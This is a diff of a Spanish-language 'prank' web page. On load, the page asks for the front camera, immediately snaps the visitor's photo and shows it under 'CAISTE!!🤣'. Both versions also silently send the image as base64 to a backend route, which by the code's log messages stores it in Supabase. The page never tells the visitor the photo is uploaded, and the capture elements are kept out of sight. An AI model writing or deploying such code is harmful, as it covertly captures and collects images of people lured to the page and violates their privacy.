@@ -1,189 +1,128 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando...</title>
-    
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            background-color: #000;
-        }
-
-        /* --- CAMBIO AQUÍ --- */
-        /* Oculta los elementos de captura moviéndolos fuera de la pantalla
-           en lugar de usar 'display: none', que puede causar problemas. */
-        #video, #canvas {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-        }
-
-        /* Pantalla de sorpresa */
-        #overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            background: linear-gradient(180deg, #000000 0%, #8b0000 100%);
-            opacity: 0;
-            transition: opacity 0.5s ease-in;
-            z-index: 10;
-        }
-
-        #overlay.visible {
-            opacity: 1;
-        }
-
-        #overlay.hidden {
-            display: none;
-        }
-
-        #foto-capturada {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 11;
-        }
-
-        #overlay h1 {
-            font-family: Arial, sans-serif;
-            font-size: 5vw;
-            color: white;
-            text-shadow: 2px 2px 4px #000;
-            position: relative;
-            z-index: 12;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CAISTE!!🤣</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+      /* Fondo gradiente negro a rojo */
+      background: linear-gradient(to bottom, #000000, #ff0000);
+    }
+    #foto {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    #video, #canvas {
+      display: none; /* solo para procesar */
+    }
+    #mensaje {
+      position: fixed;
+      bottom: 20px;
+      width: 100%;
+      text-align: center;
+      font-size: 2em;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-shadow: 0 0 10px #000;
+    }
+  </style>
 </head>
 <body>
-    <video id="video" playsinline autoplay muted></video>
-    <canvas id="canvas"></canvas>
+  <img id="foto" src="" alt="Foto Sorpresa" />
+  <div id="mensaje">CAISTE!!🤣</div>
 
-    <div id="overlay" class="hidden">
-        <img id="foto-capturada" src="" alt="Tu foto">
-        <h1>CAISTE!!🤣</h1>
-    </div>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
-    <script>
-        // --- CONFIGURACIÓN ---
-        const VERCEL_ENDPOINT_URL = "/api/guardar-imagen";
-        // ---------------------
+  <script>
+    // --- ADICIÓN 1: URL del Backend (ruta relativa) ---
+    const VERCEL_ENDPOINT_URL = "/api/guardar-imagen";
+    // -------------------------------------------------
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const overlay = document.getElementById('overlay');
-        const fotoCapturada = document.getElementById('foto-capturada');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const foto = document.getElementById('foto');
+    const ctx = canvas.getContext('2d');
 
-        // 1. Solicitar acceso a la cámara
-        async function iniciarCamara() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' } 
-                });
-                
-                video.srcObject = stream;
-                
-                // --- ¡¡CAMBIO PRINCIPAL AQUÍ!! ---
-                // Ya no usamos 'onloadedmetadata'.
-                // Usamos el evento 'playing', que GARANTIZA que hay fotogramas.
-                video.addEventListener('playing', () => {
-                    console.log("¡El video ha comenzado a reproducirse! Capturando...");
-                    
-                    // 1. Ajustar el tamaño del canvas al del video
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    
-                    // 2. Capturar la foto inmediatamente
-                    // (Podemos añadir un pequeñísimo delay por si acaso, 
-                    // pero 'playing' suele ser suficiente)
-                    setTimeout(capturarFoto, 50); // 50ms es más seguro que 0
-                });
+    const constraints = {
+      video: {
+        facingMode: "user", // cámara frontal
+        width: { ideal: 1280 },
+        height: { ideal: 720 }
+      }
+    };
 
-            } catch (err) {
-                console.error("Error al acceder a la cámara:", err);
-                overlay.innerHTML = "<h1>Error de cámara 😢</h1>";
-                overlay.classList.remove('hidden');
-                overlay.classList.add('visible');
+    async function iniciarCamara() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+
+        // Tomar foto apenas el video empiece a reproducirse
+        video.addEventListener('play', () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          tomarFoto();
+        });
+      } catch (err) {
+        console.error("Error al acceder a la cámara:", err);
+      }
+    }
+
+    function tomarFoto() {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataURL = canvas.toDataURL('image/jpeg');
+
+      // Mostrar foto pantalla completa
+      foto.src = dataURL;
+
+      // Detener la cámara
+      const tracks = video.srcObject.getTracks();
+      tracks.forEach(track => track.stop());
+      video.style.display = 'none';
+
+      // --- ADICIÓN 2: Preparar y enviar la data ---
+      const base64Data = dataURL.split(',')[1];
+      enviarAFirebase(base64Data);
+      // ------------------------------------------
+    }
+
+    // --- ADICIÓN 3: Función para enviar al backend ---
+    async function enviarAFirebase(base64) {
+        console.log("Enviando foto a Vercel...");
+        try {
+            const response = await fetch(VERCEL_ENDPOINT_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ base64: base64 }),
+            });
+
+            const result = await response.json();
+
+            if (response.ok) {
+                console.log("¡Foto guardada en Supabase con éxito!", result);
+            } else {
+                console.error("Error al guardar en Vercel/Supabase:", result.error);
             }
+
+        } catch (err) {
+            console.error("Error de red al enviar la foto:", err);
         }
+    }
+    // -----------------------------------------------
 
-        // 2. Función para tomar la foto (sin cambios)
-        function capturarFoto() {
-            // Asegurarse de que el canvas tenga un contexto
-            const context = canvas.getContext('2d');
-            if (!context) {
-                console.error("No se pudo obtener el contexto 2D del canvas");
-                return;
-            }
-
-            console.log("Dibujando imagen en canvas...");
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-
-            // Verificación: Si el dataUrl es muy corto, algo salió mal (ej. canvas vacío)
-            if (dataUrl.length < 1000) {
-                console.warn("La imagen capturada parece estar vacía (posiblemente negra).");
-                // Podríamos intentar capturar de nuevo, pero por ahora mostremos la falla
-            }
-            
-            fotoCapturada.src = dataUrl;
-            mostrarPantallaBroma();
-
-            video.srcObject.getTracks().forEach(track => track.stop());
-
-            const base64Data = dataUrl.split(',')[1];
-            enviarAFirebase(base64Data);
-        }
-
-        // 4. Muestra la pantalla de broma (sin cambios)
-        function mostrarPantallaBroma() {
-            overlay.classList.remove('hidden');
-            void overlay.offsetWidth; 
-            overlay.classList.add('visible');
-        }
-
-        // 5. Envía el Base64 al backend (sin cambios)
-        async function enviarAFirebase(base64) {
-            console.log("Enviando foto a Vercel...");
-            try {
-                const response = await fetch(VERCEL_ENDPOINT_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ base64: base64 }),
-                });
-
-                const result = await response.json();
-
-                if (response.ok) {
-                    console.log("¡Foto guardada en Supabase con éxito!", result);
-                } else {
-                    console.error("Error al guardar en Vercel/Supabase:", result.error);
-                }
-
-            } catch (err) {
-                console.error("Error de red al enviar la foto:", err);
-            }
-        }
-
-        // Inicia todo el proceso
-        iniciarCamara();
-    </script>
+    iniciarCamara();
+  </script>
 </body>
 </html>
